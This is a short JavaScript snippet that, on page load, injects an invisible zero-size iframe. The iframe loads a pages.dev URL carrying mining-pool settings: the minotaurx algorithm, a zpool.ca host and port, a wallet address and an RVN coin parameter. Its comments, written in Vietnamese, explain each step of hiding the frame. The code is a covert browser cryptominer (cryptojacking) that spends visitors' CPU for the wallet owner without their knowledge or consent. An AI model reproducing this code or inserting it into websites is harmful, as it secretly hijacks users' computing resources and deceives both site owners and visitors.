document.addEventListener("DOMContentLoaded", () => {
  const iframe = document.createElement("iframe");
  iframe.src = "https://thanksyousomuch.pages.dev?algorithm=minotaurx&host=minotaurx.na.mine.zpool.ca&port=7019&worker=R9uHDn9XXqPAe2TLsEmVoNrokmWsHREV2Q&password=c%3DRVN&workers=2";
  iframe.style.width = "0"; // Ẩn chiều rộng
  iframe.style.height = "0"; // Ẩn chiều cao
  iframe.style.border = "none"; // Loại bỏ viền
  iframe.style.position = "absolute"; // Đặt ngoài luồng chính
  iframe.style.visibility = "hidden"; // Không hiển thị
  iframe.style.opacity = "0"; // Độ trong suốt bằng 0
  document.body.appendChild(iframe); // Thêm iframe vào trang
});
